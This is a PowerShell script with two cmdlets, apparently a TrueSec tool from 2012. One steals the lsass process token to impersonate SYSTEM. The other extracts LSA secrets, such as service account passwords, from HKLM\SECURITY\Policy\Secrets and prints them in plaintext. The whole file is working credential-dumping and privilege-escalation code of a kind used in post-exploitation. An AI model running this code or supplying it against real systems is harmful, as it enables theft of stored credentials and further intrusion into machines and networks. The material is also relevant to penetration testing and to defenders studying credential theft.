<#
.SYNOPSIS
Duplicates the Access token of lsass and sets it in the current process thread.
.DESCRIPTION
The Enable-TSDuplicateToken CmdLet duplicates the Access token of lsass and sets it in the current process thread. The CmdLet must be run with elevated permissions.
.EXAMPLE
Enable-TSDuplicateToken
.LINK
http://www.truesec.com
.NOTES
Goude 2012, TreuSec
#>
function Enable-TSDuplicateToken {
    [CmdletBinding()] param()

    $signature = @"
[StructLayout(LayoutKind.Sequential, Pack = 1)]
 public struct TokPriv1Luid
 {
     public int Count;
     public long Luid;
     public int Attr;
 }

public const int SE_PRIVILEGE_ENABLED = 0x00000002;
public const int TOKEN_QUERY = 0x00000008;
public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;

public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
public const UInt32 TOKEN_DUPLICATE = 0x0002;
public const UInt32 TOKEN_IMPERSONATE = 0x0004;
public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
  TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
  TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
  TOKEN_ADJUST_SESSIONID);

public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege";
public const int ANYSIZE_ARRAY = 1;

[StructLayout(LayoutKind.Sequential)]
public struct LUID
{
  public UInt32 LowPart;
  public UInt32 HighPart;
}

[StructLayout(LayoutKind.Sequential)]
public struct LUID_AND_ATTRIBUTES {
   public LUID Luid;
   public UInt32 Attributes;
}


public struct TOKEN_PRIVILEGES {
  public UInt32 PrivilegeCount;
  [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)]
  public LUID_AND_ATTRIBUTES [] Privileges;
}

[DllImport("advapi32.dll", SetLastError=true)]
 public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int
    SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);


[DllImport("advapi32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool SetThreadToken(
  IntPtr PHThread,
  IntPtr Token
);

[DllImport("advapi32.dll", SetLastError=true)]
 [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool OpenProcessToken(IntPtr ProcessHandle, 
   UInt32 DesiredAccess, out IntPtr TokenHandle);

[DllImport("advapi32.dll", SetLastError = true)]
public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

[DllImport("kernel32.dll", ExactSpelling = true)]
public static extern IntPtr GetCurrentProcess();

[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
 public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
 ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
"@

    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
        Write-Warning "Run the Command as an Administrator"
        Break
    }

    Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv
    $adjPriv = [AdjPriv.AdjPriv]
    [long]$luid = 0

    $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid
    $tokPriv1Luid.Count = 1
    $tokPriv1Luid.Luid = $luid
    $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED

    $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid)

    [IntPtr]$htoken = [IntPtr]::Zero
    $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken)
  
    $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES
    $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)

    if(-not($retVal)) {
        [System.Runtime.InteropServices.marshal]::GetLastWin32Error()
        Break
    }

    $process = (Get-Process -Name lsass)
    [IntPtr]$hlsasstoken = [IntPtr]::Zero
    $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken)

    [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero
    $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle)

    $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle)
    if(-not($retVal)) {
        [System.Runtime.InteropServices.marshal]::GetLastWin32Error()
    }
}

<#
.SYNOPSIS
Displays LSA Secrets from local computer.
.DESCRIPTION
Extracts LSA secrets from HKLM:\\SECURITY\Policy\Secrets\ on a local computer. The CmdLet must be run with elevated permissions, in 32-bit mode and requires permissions to the security key in HKLM.
.PARAMETER Key
Name of Key to Extract. if the parameter is not used, all secrets will be displayed. (See names of keys in HKLM:\SECURITY\Policy\Secrets\)
.EXAMPLE
Enable-TSDuplicateToken
Get-TSLsaSecret
.EXAMPLE
Enable-TSDuplicateToken
Get-TSLsaSecret -Key KeyName
.LINK
http://www.truesec.com
.NOTES
Goude 2012, TreuSec
#>
function Get-TSLsaSecret {
    [CmdletBinding()] param(
        [Parameter(Position=0, ValueFromPipeLine=$true)] [Alias("RegKey")] [string[]]$RegistryKey
    )

    Begin {
        # Check if User is Elevated
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
          Write-Warning "Run the Command as an Administrator"
          Break
        }

        # Check if Script is run in a 32-bit Environment by checking a Pointer Size
        if([System.IntPtr]::Size -eq 8) {
          Write-Warning "Run PowerShell in 32-bit mode"
          Break
        }



        # Check if RegKey is specified
        if([string]::IsNullOrEmpty($registryKey)) {
          [string[]]$registryKey = (Split-Path (Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty Name) -Leaf)
        }

        # Create Temporary Registry Key
        if( -not(Test-Path "HKLM:\\SECURITY\Policy\Secrets\MySecret")) {
          mkdir "HKLM:\\SECURITY\Policy\Secrets\MySecret" | Out-Null
        }

        $signature = @"
[StructLayout(LayoutKind.Sequential)]
public struct LSA_UNICODE_STRING
{
  public UInt16 Length;
  public UInt16 MaximumLength;
  public IntPtr Buffer;
}

[StructLayout(LayoutKind.Sequential)]
public struct LSA_OBJECT_ATTRIBUTES
{
  public int Length;
  public IntPtr RootDirectory;
  public LSA_UNICODE_STRING ObjectName;
  public uint Attributes;
  public IntPtr SecurityDescriptor;
  public IntPtr SecurityQualityOfService;
}

public enum LSA_AccessPolicy : long
{
  POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
  POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
  POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
  POLICY_TRUST_ADMIN = 0x00000008L,
  POLICY_CREATE_ACCOUNT = 0x00000010L,
  POLICY_CREATE_SECRET = 0x00000020L,
  POLICY_CREATE_PRIVILEGE = 0x00000040L,
  POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
  POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
  POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
  POLICY_SERVER_ADMIN = 0x00000400L,
  POLICY_LOOKUP_NAMES = 0x00000800L,
  POLICY_NOTIFICATION = 0x00001000L
}

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaRetrievePrivateData(
  IntPtr PolicyHandle,
  ref LSA_UNICODE_STRING KeyName,
  out IntPtr PrivateData
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaStorePrivateData(
  IntPtr policyHandle,
  ref LSA_UNICODE_STRING KeyName,
  ref LSA_UNICODE_STRING PrivateData
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaOpenPolicy(
  ref LSA_UNICODE_STRING SystemName,
  ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
  uint DesiredAccess,
  out IntPtr PolicyHandle
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaNtStatusToWinError(
  uint status
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaClose(
  IntPtr policyHandle
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaFreeMemory(
  IntPtr buffer
);
"@

        Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
    }

    Process{
        foreach($key in $RegistryKey) {
            $regPath = "HKLM:\\SECURITY\Policy\Secrets\" + $key
            $tempRegPath = "HKLM:\\SECURITY\Policy\Secrets\MySecret"
            $myKey = "MySecret"
            if (Test-Path $regPath) {
                Try {
                    Get-ChildItem $regPath -ErrorAction Stop | Out-Null
                }
                Catch {
                    Write-Error -Message "Access to registry Denied, run as NT AUTHORITY\SYSTEM" -Category PermissionDenied
                    Break
                }

                if(Test-Path $regPath) {
                    # Copy Key
                    "CurrVal","OldVal","OupdTime","CupdTime","SecDesc" | ForEach-Object {
                        $copyFrom = "HKLM:\SECURITY\Policy\Secrets\" + $key + "\" + $_
                        $copyTo = "HKLM:\SECURITY\Policy\Secrets\MySecret\" + $_

                        if( -not(Test-Path $copyTo) ) {
                          mkdir $copyTo | Out-Null
                        }
                        $item = Get-ItemProperty $copyFrom
                        Set-ItemProperty -Path $copyTo -Name '(default)' -Value $item.'(default)'
                    }
                }
                # Attributes
                $objectAttributes = New-Object LSAUtil.LSAUtil+LSA_OBJECT_ATTRIBUTES
                $objectAttributes.Length = 0
                $objectAttributes.RootDirectory = [IntPtr]::Zero
                $objectAttributes.Attributes = 0
                $objectAttributes.SecurityDescriptor = [IntPtr]::Zero
                $objectAttributes.SecurityQualityOfService = [IntPtr]::Zero

                # localSystem
                $localsystem = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
                $localsystem.Buffer = [IntPtr]::Zero
                $localsystem.Length = 0
                $localsystem.MaximumLength = 0

                # Secret Name
                $secretName = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
                $secretName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($myKey)
                $secretName.Length = [Uint16]($myKey.Length * [System.Text.UnicodeEncoding]::CharSize)
                $secretName.MaximumLength = [Uint16](($myKey.Length + 1) * [System.Text.UnicodeEncoding]::CharSize)

                # Get LSA PolicyHandle
                $lsaPolicyHandle = [IntPtr]::Zero
                [LSAUtil.LSAUtil+LSA_AccessPolicy]$access = [LSAUtil.LSAUtil+LSA_AccessPolicy]::POLICY_GET_PRIVATE_INFORMATION
                $lsaOpenPolicyHandle = [LSAUtil.LSAUtil]::LSAOpenPolicy([ref]$localSystem, [ref]$objectAttributes, $access, [ref]$lsaPolicyHandle)

                if($lsaOpenPolicyHandle -ne 0) {
                    Write-Warning "lsaOpenPolicyHandle Windows Error Code: $lsaOpenPolicyHandle"
                    Continue
                }

                # Retrieve Private Data
                $privateData = [IntPtr]::Zero
                $ntsResult = [LSAUtil.LSAUtil]::LsaRetrievePrivateData($lsaPolicyHandle, [ref]$secretName, [ref]$privateData)

                $lsaClose = [LSAUtil.LSAUtil]::LsaClose($lsaPolicyHandle)

                $lsaNtStatusToWinError = [LSAUtil.LSAUtil]::LsaNtStatusToWinError($ntsResult)

                if($lsaNtStatusToWinError -ne 0) {
                    Write-Warning "lsaNtsStatusToWinError: $lsaNtStatusToWinError"
                }

                [LSAUtil.LSAUtil+LSA_UNICODE_STRING]$lusSecretData =
                [LSAUtil.LSAUtil+LSA_UNICODE_STRING][System.Runtime.InteropServices.marshal]::PtrToStructure($privateData, [System.Type] [LSAUtil.LSAUtil+LSA_UNICODE_STRING])

                Try {
                    [string]$value = [System.Runtime.InteropServices.marshal]::PtrToStringAuto($lusSecretData.Buffer)
                    $value = $value.SubString(0, ($lusSecretData.Length / 2))
                }
                Catch {
                    $value = ""
                }

                if($key -match "^_SC_") {
                    # Get Service Account
                    $serviceName = $key -Replace "^_SC_"
                    Try {
                        # Get Service Account
                        $service = Get-WmiObject -Query "SELECT StartName FROM Win32_Service WHERE Name = '$serviceName'" -ErrorAction Stop
                        $account = $service.StartName
                    }
                    Catch {
                        $account = ""
                    }
                }
                else {
                    $account = ""
                }

                # Return Object
                New-Object PSObject -Property @{
                    Name = $key;
                    Secret = $value;
                    Account = $Account
                } | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
            }
            else {
                Write-Error -Message "Path not found: $regPath" -Category ObjectNotFound
          }
        }
    }
    end {
        if(Test-Path $tempRegPath) {
            Remove-Item -Path "HKLM:\\SECURITY\Policy\Secrets\MySecret" -Recurse -Force
        }
    }
}
